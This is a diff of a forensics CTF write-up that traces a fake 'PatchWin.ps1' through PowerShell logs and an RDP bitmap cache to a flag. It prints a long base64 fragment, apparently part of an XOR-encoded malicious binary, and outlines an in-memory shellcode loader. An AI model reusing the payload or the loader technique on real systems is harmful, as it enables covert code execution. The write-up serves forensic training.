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
-
-ScriptBlock ID: b48f1a6d-50bd-4cbb-a5b9-f97580fa35b4
-Path: C:\Users\john.it\Downloads\PatchWin\PatchWin.ps1
 ```
 
+Then there's a command that acts as a shellcode loader to run a binary directly in memory. The binary is included as a base64 string and it is also XORed using as key 35 (decimal). Below a summary of the command that is run:
 
+```powershell
+function func_get_proc_address {
+	Param ($var_module, $var_procedure)		
+	...
+}
 
-```
-# Path to the PowerShell event log (adjust if needed)
-$logPath = "C:\Users\guillermo.lafuente\Desktop\CTFs\Dubai-police-CTF-2025\Finals\LateralTrace\LateralTrace\C\Windows\System32\winevt\logs\Microsoft-Windows-PowerShell%4Operational.evtx"
+function func_get_delegate_type {
+	Param (
+		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
+		[Parameter(Position = 1)] [Type] $var_return_type = [Void]
+	)
 
-# Extract raw ScriptBlock text, no truncation
-Get-WinEvent -Path $logPath -FilterXPath "*[System/EventID=4104]" | ForEach-Object {
-    $xml = [xml]$_.ToXml()
-    $scriptBlock = $xml.Event.EventData.Data.'#text'
-    if ($scriptBlock) {
-        # Write full line without truncation
-        Add-Content -Path "scriptblocks_raw_full.txt" -Value $scriptBlock
-    }
+	...
+
+	return $var_type_builder.CreateType()
+}
+
+If ([IntPtr]::size -eq 8) {
+	[Byte[]]$var_code = [System.Convert]::FromBase64String('...very long base64 string...')
+	for ($x = 0; $x -lt $var_code.Count; $x++) {
+		$var_code[$x] = $var_code[$x] -bxor 35
+	}
+
+	...
 }
 
 ```
 
+Because the base64 is a large string, the log spans across 21 Scriptblocks in the logs. Just to check what was the file, I used the below script with the base64 string of the first Scriptblock:
 
-powershell to extract the powershell command with the obfuscated binary:
+```python
+import base64
+
+b64 = ""  # paste your base64 string here
+data = base64.b64decode(b64)
+
+# XOR with 0x23 (decimal 35)
+decoded = bytes([b ^ 0x23 for b in data])
+
+# Try UTF-8 decode
+try:
+    text = decoded.decode('utf-8', errors='replace')
+    print("=== UTF-8 attempt ===")
+    print(text)
+except Exception as e:
+    print("UTF-8 decode error:", e)
+
+# Save to disk
+with open("decoded_xor.bin", "wb") as f:
+    f.write(decoded)
+print("Saved binary to decoded_xor.bin")
 
 ```
-# PowerShell script to extract the complete obfuscated command from event logs
 
-# This script searches for the 21 scriptblocks in the PowerShell event log
+The output confirmed that we are dealing with a binary file:
 
-  
-
-Write-Host "=== Searching for PatchWin.ps1 with 21 scriptblocks ===" -ForegroundColor Green
-
-  
-
-try {
-
-    # Get all PowerShell events
-
-    $events = Get-WinEvent -Path 'Windows\System32\winevt\logs\Microsoft-Windows-PowerShell%4Operational.evtx' -ErrorAction Stop
-
-    Write-Host "Found $($events.Count) PowerShell events" -ForegroundColor Cyan
-
-    # Search for events containing "21" and "scriptblock"
-
-    $targetEvents = $events | Where-Object { $_.Message -match '21.*scriptblock|scriptblock.*21' }
-
-    if ($targetEvents.Count -gt 0) {
-
-        Write-Host "Found $($targetEvents.Count) events with 21 scriptblocks!" -ForegroundColor Green
-
-        foreach ($event in $targetEvents) {
-
-            Write-Host "`n=== Event Details ===" -ForegroundColor Yellow
-
-            Write-Host "Time: $($event.TimeCreated)" -ForegroundColor Cyan
-
-            Write-Host "Event ID: $($event.Id)" -ForegroundColor Cyan
-
-            Write-Host "Level: $($event.LevelDisplayName)" -ForegroundColor Cyan
-
-            Write-Host "`n=== Message Content ===" -ForegroundColor Yellow
-
-            Write-Host $event.Message -ForegroundColor White
-
-            # Save the complete message to a file for analysis
-
-            $event.Message | Out-File -FilePath "patchwin_complete_message.txt" -Encoding UTF8
-
-            Write-Host "`nComplete message saved to: patchwin_complete_message.txt" -ForegroundColor Green
-
-        }
-
-    } else {
-
-        Write-Host "No events found with 21 scriptblocks. Searching for other patterns..." -ForegroundColor Yellow
-
-        # Try searching for "PatchWin" specifically
-
-        $patchwinEvents = $events | Where-Object { $_.Message -match 'PatchWin' }
-
-        if ($patchwinEvents.Count -gt 0) {
-
-            Write-Host "Found $($patchwinEvents.Count) events mentioning PatchWin!" -ForegroundColor Green
-
-            foreach ($event in $patchwinEvents) {
-
-                Write-Host "`n=== PatchWin Event ===" -ForegroundColor Yellow
-
-                Write-Host "Time: $($event.TimeCreated)" -ForegroundColor Cyan
-
-                Write-Host "Event ID: $($event.Id)" -ForegroundColor Cyan
-
-                Write-Host "Message: $($event.Message)" -ForegroundColor White
-
-            }
-
-        } else {
-
-            Write-Host "No PatchWin events found. Searching for scriptblock events..." -ForegroundColor Yellow
-
-            # Search for any scriptblock events
-
-            $scriptblockEvents = $events | Where-Object { $_.Message -match 'scriptblock' }
-
-            if ($scriptblockEvents.Count -gt 0) {
-
-                Write-Host "Found $($scriptblockEvents.Count) scriptblock events" -ForegroundColor Green
-
-                # Show the most recent ones
-
-                $recentScriptblocks = $scriptblockEvents | Sort-Object TimeCreated -Descending | Select-Object -First 5
-
-                foreach ($event in $recentScriptblocks) {
-
-                    Write-Host "`n=== Scriptblock Event ===" -ForegroundColor Yellow
-
-                    Write-Host "Time: $($event.TimeCreated)" -ForegroundColor Cyan
-
-                    Write-Host "Event ID: $($event.Id)" -ForegroundColor Cyan
-
-                    Write-Host "Message preview: $($event.Message.Substring(0, [Math]::Min(200, $event.Message.Length)))..." -ForegroundColor White
-
-                }
-
-            } else {
-
-                Write-Host "No scriptblock events found." -ForegroundColor Red
-
-            }
-
-        }
-
-    }
-
-} catch {
-
-    Write-Host "Error accessing PowerShell event log: $($_.Exception.Message)" -ForegroundColor Red
-
-    Write-Host "This might be because the event log file is locked or doesn't exist." -ForegroundColor Yellow
-
-}
+```
+MZARUH��H�� H�����H��H��Dd��A��VhZH�������      �!�L�!This program cannot be run in DOS mode.
 ```
 
+As interesting as that was, it is a dead end. There is no additional PowerShell logs that point to access to another machine.
+
+After checking what other files were in files provided, I noticed that there was an RDP cache file (`Cache0000.bin`) at:
+`C\Users\john.it\AppData\Local\Microsoft\Terminal Server Client\Cache`
+
+The file is a RDP8bmp file. [BMC-tools](https://github.com/ANSSI-FR/bmc-tools) is a RDP Bitmap Cache parser that we can use to extract images from the cache:
+
+```
+python3 bmc-tools.py -s Cache0000.bin -d images
+[+++] Processing a single file: 'Cache0000.bin'.
+[+++] Processing a file: 'Cache0000.bin'.
+[===] 1070 tiles successfully extracted in the end.
+[===] Successfully exported 1070 files.
+```
+
+Checking the folder with the images showed an interesting string:
+
+![[Pasted image 20251103214007.png]]
+
+I tried to put the string together, but the images are not in order, so I used another tool to help me stitching them together ([RdpCacheStitcher](https://github.com/BSI-Bund/RdpCacheStitcher)):
+
+![[Pasted image 20251103214944.png]]
+
+So the string is: `echo "ZmxhZ3tyZHBfYm1wX2NhY2hlXzlmNGNlfQ==" > flag.txt`
+
+If we base64 decode it: `flag{rdp_bmp_cache_9f4ce}`
